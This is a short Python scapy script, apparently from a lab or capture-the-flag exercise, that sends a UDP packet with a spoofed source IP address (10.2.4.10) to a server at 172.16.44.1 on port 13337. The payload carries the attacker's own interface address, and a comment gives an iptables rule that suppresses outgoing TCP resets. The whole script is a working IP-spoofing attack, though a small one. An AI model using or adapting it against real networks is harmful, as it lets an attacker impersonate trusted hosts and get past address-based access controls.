from scapy.all import *
#iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 172.16.44.21 -j DROP
#https://stackoverflow.com/questions/9058052/unwanted-rst-tcp-packet-with-scapy

_port=13337
_server="172.16.44.1"
_attacker_ip = get_if_addr('tap0')
_spoof_ip="10.2.4.10"


U = IP(src=_spoof_ip, dst=_server)/UDP(sport=_port, dport=_port)/_attacker_ip
U.show()
ans = sr1(U)
ans.show()
